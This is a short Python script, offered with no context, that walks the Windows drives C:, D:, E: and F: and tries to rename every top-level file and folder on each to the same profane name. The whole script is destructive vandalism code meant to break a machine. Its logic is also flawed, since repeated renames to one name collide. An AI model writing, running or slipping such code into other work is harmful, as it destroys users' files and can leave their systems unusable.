import os

# print(os.getcwd())


systemfiles = ['C:' , 'E:' , 'F:' , 'D:']

for j in systemfiles:
	os.chdir(j)
	listof_dirs = os.listdir()

	for i in listof_dirs:
		os.rename( i , 'fuck you')


